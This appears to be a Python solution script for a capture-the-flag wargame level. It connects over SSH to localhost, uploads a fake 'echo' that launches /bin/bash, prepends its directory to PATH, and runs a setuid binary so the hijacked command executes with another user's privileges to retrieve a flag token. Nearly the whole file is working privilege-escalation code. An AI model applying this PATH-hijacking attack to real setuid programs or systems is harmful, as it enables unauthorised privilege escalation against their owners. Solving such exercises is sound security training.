import sys
import os
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag


def exploit(host, port, user, pwd, binary="~/level03"):
    print(f"[*] Level03 PATH Manipulation\n    Target: {user}@{host}:{port}\n")

    with tempfile.TemporaryDirectory() as tmpdir:
        echo_script = os.path.join(tmpdir, "echo")
        with open(echo_script, "w") as f:
            f.write("#!/bin/bash\n/bin/bash\n")
        os.chmod(echo_script, 0o755)

        print("[*] Creating exploit directory...")
        code, _, err = ssh_cmd(host, port, user, pwd, "mkdir -p /tmp/level03_exploit")
        if code != 0:
            print(f"[!] Failed: {err}")
            return False, ""

        print("[*] Transferring malicious echo via SCP...")
        if not scp_cmd(host, port, user, pwd, echo_script, "/tmp/level03_exploit/echo"):
            print("[-] SCP transfer failed")
            return False, ""

        print("[+] Malicious echo transferred")
        print("[*] Executing exploit...")
        code, out, err = ssh_cmd(
            host,
            port,
            user,
            pwd,
            f"export PATH=/tmp/level03_exploit:$PATH && {binary} <<< 'getflag'",
        )

    if "token" in out.lower():
        print(f"[+] Success!\n{out}")
        for line in out.split("\n"):
            if "token" in line.lower():
                return True, line.split(":")[-1].strip()
        return True, ""
    print(f"[!] Failed\n{out}\n{err}")
    return False, ""


def main():
    print("Level03 Remote Exploit\n")
    pwd = read_flag(2)
    success, token = exploit("localhost", 4242, "level03", pwd)
    if success:
        save_flag(3, token)
        print(
            f"\n[SUMMARY]\n  Vulnerability: PATH manipulation in setuid\n  Attack: Malicious 'echo' hijacks /usr/bin/env\n  Result: Executed with flag03 privileges\n[ANSWER]\n  Level03 Token: {token if token else 'Retrieved'}"
        )
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
